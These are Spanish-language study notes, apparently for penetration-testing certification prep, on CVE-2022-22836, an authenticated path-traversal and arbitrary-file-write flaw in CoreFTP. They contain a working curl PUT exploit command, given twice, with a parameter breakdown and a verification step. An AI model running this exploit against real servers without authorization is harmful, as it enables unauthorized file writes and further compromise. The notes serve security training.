
## 1. CVE-2022-22836 - CoreFTP

**CVE-2022-22836** afecta a versiones de **CoreFTP anteriores a la build 727**.

La vulnerabilidad permite realizar dos ataques:

- **Authenticated Path Traversal:** escapar del directorio restringido mediante secuencias `../`.
    
- **Arbitrary File Write:** escribir archivos en ubicaciones no autorizadas del sistema.
    

El servicio procesa incorrectamente las rutas enviadas mediante peticiones HTTP `PUT`, permitiendo escribir archivos fuera del directorio FTP autorizado.

**Requisito:** disponer de credenciales válidas para autenticarse en el servicio.

## 2. Explotación con cURL

Podemos explotar la vulnerabilidad mediante una petición HTTP `PUT` autenticada.

```
curl -k -X PUT \
-H "Host: <IP>" \
--basic -u <USER>:<PASSWORD> \
--data-binary "PoC." \
--path-as-is \
https://<IP>/../../../../../../whoops
```

### Parámetros

|Parámetro|Descripción|
|---|---|
|`-k`|Ignora errores de validación del certificado SSL/TLS.|
|`-X PUT`|Utiliza el método HTTP PUT para escribir el archivo.|
|`-H "Host: <IP>"`|Especifica la cabecera Host.|
|`--basic`|Utiliza autenticación HTTP Basic.|
|`-u`|Proporciona usuario y contraseña.|
|`--data-binary`|Define el contenido que se escribirá en el archivo.|
|`--path-as-is`|Evita que cURL normalice la ruta y elimine las secuencias `../`.|

### Funcionamiento

La ruta vulnerable contiene:

```
/../../../../../../whoops
```

Cada `../` permite retroceder un nivel en la estructura de directorios.

El servidor procesa incorrectamente esta ruta y permite escapar del directorio FTP restringido.

Posteriormente, la petición `PUT` escribe el contenido indicado en el archivo de destino.

En el ejemplo:

```
Archivo: whoops
Contenido: PoC.
```

## 3. Verificación de la explotación

En el ejemplo de HTB, el archivo se crea en la raíz de la unidad `C:` del sistema Windows.

Podemos comprobarlo desde el objetivo:

```
type C:\whoops
```

Resultado:

```
PoC.
```

Esto confirma que hemos conseguido escribir un archivo fuera del directorio FTP autorizado.

## 4. Conceptos importantes

### Path Traversal

Permite escapar de un directorio restringido utilizando secuencias como:

```
../
../../
../../../
```

En este caso, el servidor no valida correctamente la ruta proporcionada por el usuario.

### Arbitrary File Write

Permite escribir archivos en ubicaciones que normalmente deberían estar restringidas.

La ubicación final dependerá de los permisos del proceso que ejecuta el servicio.

**Importante:** conseguir escritura arbitraria no implica automáticamente ejecución remota de código (RCE). Para conseguir RCE sería necesario encontrar una forma de ejecutar el archivo escrito.

## 5. Comando importante para CPTS / OSCP

```
# CoreFTP CVE-2022-22836 - Authenticated Path Traversal + Arbitrary File Write

curl -k -X PUT \
-H "Host: <IP>" \
--basic -u <USER>:<PASSWORD> \
--data-binary "PoC." \
--path-as-is \
https://<IP>/../../../../../../whoops
```

**Puntos clave:**

- Afecta a **CoreFTP anterior a build 727**.
    
- Requiere autenticación.
    
- Combina **Path Traversal + Arbitrary File Write**.
    
- Utiliza peticiones HTTP `PUT`.
    
- `--path-as-is` es fundamental para conservar las secuencias `../`.
    
- Permite escribir archivos fuera del directorio FTP autorizado.
    
- La escritura de archivos podría facilitar otros ataques dependiendo de la ubicación y los permisos disponibles.
